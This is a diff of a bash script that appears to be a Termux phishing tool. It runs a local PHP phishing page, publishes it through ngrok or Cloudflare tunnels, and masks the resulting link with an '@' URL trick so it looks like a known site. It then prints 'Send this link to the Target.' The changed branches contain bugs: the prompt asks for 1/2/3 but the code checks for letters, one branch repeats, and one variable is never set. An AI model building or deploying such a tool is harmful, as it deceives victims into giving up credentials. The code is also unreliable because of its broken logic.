@@ -14,6 +14,7 @@ read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Accepted This Notice \e[1;91m (Y/N
 echo""
 echo""
 wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
+chmod +x *
 echo""
 
 if [[ $option == *'N'* ]]; then
@@ -68,8 +69,70 @@ echo ""
 			   echo -e $" [\e[92m*\e[91m]\e[1;93m PHP Server Now Startng ... \e[0m  "
                            echo ""
 			   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
-			   ./cloudflared tunnel -url 127.0.0.1:4444 --logfile log.txt > /dev/null 2>&1 &
-			   link=$( grep -o 'https://[-0-9a-z]*\.trycloudflare.com")
+			   echo ""
+read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Chack Link Server \e[1;91m (1/2/3) : \e[0m' option
+echo""
+
+HOST='127.0.0.1'
+PORT='4444'
+
+
+
+	echo ""		   
+if [[ $option == *'N'* ]]; then
+## Start ngrok
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	{ sleep 1; }
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
+
+    if [[ `command -v termux-chroot` ]]; then
+        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to Mustakim Ahmed (https://github.com/BDhackers009)
+    else
+        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
+    fi
+
+	{ sleep 8; clear; }
+	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
+	ngrok_url1=${ngrok_url#https://}
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
+	sleep 3
+exit
+fi
+if [[ $option == *'n'* ]]; then
+## Start Cloudflared
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	{ sleep 1; }
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
+
+    if [[ `command -v termux-chroot` ]]; then
+		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
+    else
+        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
+    fi
+
+	{ sleep 8; clear; }
+	
+	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
+	cldflr_link1=${cldflr_link#https://}
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
+	sleep 3
+exit
+fi
+if [[ $option == *'n'* ]]; then
+clear
+exit
+fi
+			   
+	
+	
+	
+	
+	
+	
+			  
+
                            sleep 3
 			   echo ""
                            echo ""
@@ -111,11 +174,11 @@ echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n
                            if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                            then
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.pubgmobile.com-@$link                                    
+                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://w.com-@$cldflr_link                             
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                            else
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
+                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$ngrok_url    
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                            fi
 			   echo ""
